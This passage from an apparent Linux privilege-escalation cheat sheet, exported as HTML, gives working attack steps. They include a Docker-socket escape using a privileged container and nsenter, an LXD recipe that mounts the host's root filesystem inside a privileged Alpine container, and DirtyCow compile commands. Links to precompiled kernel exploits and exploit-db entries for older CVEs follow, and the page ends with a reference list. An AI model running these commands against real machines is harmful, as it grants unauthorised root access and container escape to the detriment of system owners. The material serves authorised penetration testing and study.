+sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh</code></pre><h3 id="ae7c60e3-df5b-46fd-8b30-70c3479b5108" class="">LXC/LXD</h3><p id="710dd661-f202-4691-ac01-b0fa3bd104c5" class="">The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p><pre id="aa188f52-1d8f-482b-8216-d60615d27cc8" class="code"><code>╭─swissky@lab ~  
+╰─$ id
+uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)</code></pre><p id="9004394a-feb2-4a02-b671-bd3e01b4ac64" class="">Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p><pre id="689ddf1c-aae1-4849-995a-01d62d046e4f" class="code"><code># build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+./build-alpine -a i686
+
+# import the image
+lxc image import ./alpine.tar.gz --alias myimage
+
+# run the image
+lxc init myimage mycontainer -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+# interact with the container
+lxc start mycontainer
+lxc exec mycontainer /bin/sh</code></pre><p id="b27181b4-7ed2-4a54-9ae5-5ddf603c0f4e" class="">Alternatively <a href="https://github.com/initstring/lxd_root">https://github.com/initstring/lxd_root</a></p><h2 id="d5dbfc0d-b15e-44b4-9321-d970efe14609" class="">Kernel Exploits</h2><p id="192ba40b-5503-4e61-a060-e69c254eb00d" class="">Precompiled exploits can be found inside these repositories, run them at your own risk !</p><ul id="69ecf90c-7554-4b3d-a604-ab81566665ec" class="bulleted-list"><li><a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">bin-sploits - @offensive-security</a></li></ul><ul id="f397d3c9-8291-46a3-a7f5-4a427d0b5615" class="bulleted-list"><li><a href="https://github.com/lucyoa/kernel-exploits/">kernel-exploits - @lucyoa</a></li></ul><p id="dcffe302-9ee3-407e-be61-f5fea1e65e9b" class="">The following exploits are known to work well, search for another exploits using <code>searchsploit -w linux kernel centos</code>.</p><h3 id="087e2ec2-aa9e-46e7-aff4-a0d54193688b" class="">CVE-2016-5195 (DirtyCow)</h3><p id="3a98c468-a55a-4f1a-a419-457a884589a2" class="">Linux Privilege Escalation - Linux Kernel ⇐ 3.19.0-73.8</p><pre id="3896a2bf-84ac-4cb9-96e5-29182ad64daa" class="code"><code># make dirtycow stable
+echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c</code></pre><h3 id="9bcc92a1-b9e0-4768-8cef-0e07c647d34b" class="">CVE-2010-3904 (RDS)</h3><p id="069a5393-c38a-4eef-a3e8-850309c836df" class="">Linux RDS Exploit - Linux Kernel ⇐ 2.6.36-rc8</p><pre id="58996b40-5e74-42cf-9cc8-cbad2703d91c" class="code"><code>https://www.exploit-db.com/exploits/15285/</code></pre><h3 id="ac3f4692-079c-48a6-b7a6-a07558baebdd" class="">CVE-2010-4258 (Full Nelson)</h3><p id="87d80b28-25d6-4461-b9b3-73e0f5fd4e66" class="">Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p><pre id="18c7d54c-38d1-4ab2-856d-73e3776f10b1" class="code"><code>https://www.exploit-db.com/exploits/15704/</code></pre><h3 id="6b4d13f9-2f0a-4252-85ff-622c0cd7d4e1" class="">CVE-2012-0056 (Mempodipper)</h3><p id="c5539f3f-3dec-48d3-b95c-408a411375f3" class="">Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p><pre id="4ce5b996-da52-4747-b98e-b5671fddabb1" class="code"><code>https://www.exploit-db.com/exploits/18411</code></pre><h2 id="40ef112a-11db-4be0-90c1-2bedd35aff46" class="">References</h2><ul id="9b84d282-97ca-44de-b5d1-dddbabca32c5" class="bulleted-list"><li><a href="https://mn3m.info/posts/suid-vs-capabilities/">SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m</a></li></ul><ul id="3622a2a2-1dc9-4c59-a2f5-dce6ea469363" class="bulleted-list"><li><a href="https://fosterelli.co/privilege-escalation-via-docker.html">Privilege escalation via Docker - April 22, 2015 - Chris Foster</a></li></ul><ul id="7d75b2f1-9841-4526-9149-6b924a53d29f" class="bulleted-list"><li><a href="https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/">An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018</a></li></ul><ul id="1fd0a268-3e81-4c84-a0f0-b9c8ee9d8299" class="bulleted-list"><li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/">Exploiting wildcards on Linux - Berislav Kucan</a></li></ul><ul id="6d1f8442-ac38-4277-88d6-5cdb7bd04ab5" class="bulleted-list"><li><a href="http://p4pentest.in/2016/10/19/code-execution-with-tar-command/">Code Execution With Tar Command - p4pentest</a></li></ul><ul id="33966e0a-9097-4d51-9522-8312d1d3327a" class="bulleted-list"><li><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Back To The Future: Unix Wildcards Gone Wild - Leon Juranic</a></li></ul><ul id="c60790f8-3179-4dd4-a8f5-c969f1e57351" class="bulleted-list"><li><a href="https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/">HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018</a></li></ul><ul id="39cfc3b6-e3cf-4302-a97b-4e914d86c365" class="bulleted-list"><li><a href="https://reboare.github.io/lxd/lxd-escape.html">Privilege Escalation via lxd - @reboare</a></li></ul><ul id="9c35d182-848d-4268-802f-374fff3f0735" class="bulleted-list"><li><a href="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/">Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018</a></li></ul><ul id="01279648-c0e5-484e-84d9-bbc6e4dba704" class="bulleted-list"><li><a href="https://github.com/nongiach/sudo_inject">Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc</a></li></ul><ul id="b70a3d62-8a97-4cb7-92b0-654d86a98a90" class="bulleted-list"><li><a href="http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html">Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates</a></li></ul><ul id="02c0754a-6a90-426c-a0d2-0df4dd78c3b2" class="bulleted-list"><li><a href="https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf">Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</a></li></ul><figure id="353001ee-2cd5-4451-82af-8da7403d1cda" class="link-to-page"><a href="Linux%20Privilege%20Escalation/Exploits.html">Exploits</a></figure></div></article></body></html>
